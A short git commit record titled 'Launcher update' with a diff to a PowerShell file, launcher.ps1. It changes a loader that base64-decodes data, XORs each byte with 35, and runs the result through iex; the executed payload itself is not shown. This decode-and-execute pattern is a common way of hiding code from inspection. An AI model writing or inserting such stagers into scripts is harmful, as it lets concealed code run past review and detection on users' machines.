c0a6aaa019021cee2264d52cfc9a6593811799c7
Michał Rzemieniecki <michal.rzemieniecki@gmail.com>
2019-12-12 00:23:39 +0100

    Launcher update

--- launcher.ps1
+++ launcher.ps1
@@ -5,5 +5,6 @@ $file_b64 =  [Convert]::FromBase64String($f)
 for ($i = 0; $i -lt $file_b64.length; $i++) {
     $file_b64[$i] = $file_b64[$i] -bxor 35
     }
+ $out = [System.Text.Encoding]::ASCII.GetString($file_b64);
 
-  iex $file_b64
+ iex $out;
